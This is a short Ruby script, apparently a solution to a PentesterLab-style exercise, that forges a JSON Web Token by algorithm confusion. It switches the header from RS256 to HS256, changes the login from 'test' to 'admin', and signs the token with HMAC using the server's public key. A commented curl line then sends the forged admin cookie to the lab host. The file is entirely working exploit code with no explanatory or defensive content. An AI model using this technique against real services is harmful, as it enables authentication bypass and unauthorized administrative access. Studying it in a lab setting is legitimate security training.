require 'base64'
require 'openssl'

key = File.open("public.pem").read

token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6InRlc3QifQ.ZabKsEue5gDPyvwNnS8Xned104AR5V4LFaM4ApaLM9OvG2SEQbiiOwLvwFXM0mqAI7xoJXDosbjvNFzz21rthQDZseZkrw9Ogebbxr6b14wO6p64VQV0siBKroL_xWa8o5chkSru1kEEHAsEm5CaZvQlhshDvZc0gf-_eE0ZPudVO2j3ie_70dEqVCQJ5d86iYp5Ob0SRJdjpXNnYcmFnj9KOLnuM6TGzYExWqVRw2II2Iovjahq0IjacnnO47Hpixe8YHuTVZtzDTNLcqGvslNxYAq2efMWLktqM6rOU5k-CrtqVV3vc1bgcXmTOCI2_3FsnDQ2_hssWaocA18EEw"

header, payload, sing = token.split(".")

decoded_header = Base64.decode64(header)
decoded_header = decoded_header.gsub!("RS", "HS")
new_header = Base64.strict_encode64(decoded_header).gsub("=","")

decoded_payload = Base64.decode64(payload)
decoded_payload = decoded_payload.gsub!("test","admin")
new_payload = Base64.strict_encode64(decoded_payload).gsub("=","")

#puts new_header
#puts new_payload
data = new_header + "." + new_payload
signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), key, data))

#puts data

puts data+"."+signature
#curl -H "Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6ImFkbWluIn0.FSfvCBAwypJ4abF6jFLmR7JgZhkW674Z8dIdAIRyt1E" http://ptl-3d0590f1-87cf5a78.libcurl.so/
